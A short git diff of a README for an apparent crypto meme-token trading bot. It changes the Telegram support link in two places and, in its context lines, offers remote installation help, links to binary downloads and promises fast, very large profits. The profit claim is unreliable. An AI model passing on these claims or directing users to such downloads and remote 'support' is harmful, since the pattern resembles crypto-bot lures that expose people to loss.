@@ -33,7 +33,7 @@ Additionally, the bot handles all transactions fully automatically, which means 
 
 **Telegram Support**
 
-If you need any help, you can send a message on [Telegram Support](https://t.me/pancakeswapprediction) 24/7 to get free full support for the installation of the bot, either remotely or with step-by-step guidance.
+If you need any help, you can send a message on [Telegram Support](https://t.me/Web3BotSupport) 24/7 to get free full support for the installation of the bot, either remotely or with step-by-step guidance.
 
 ## [Download (Windows / macOS)](https://github.com/CryptoAiBots/Meme-Token-Hunter-Bot/releases)
 
@@ -93,4 +93,4 @@ If you have money and aim to increase it very quickly to very large amounts, you
 
 ## Links
 
-* [Telegram Support](https://t.me/pancakeswapprediction)
+* [Telegram Support](https://t.me/Web3BotSupport)
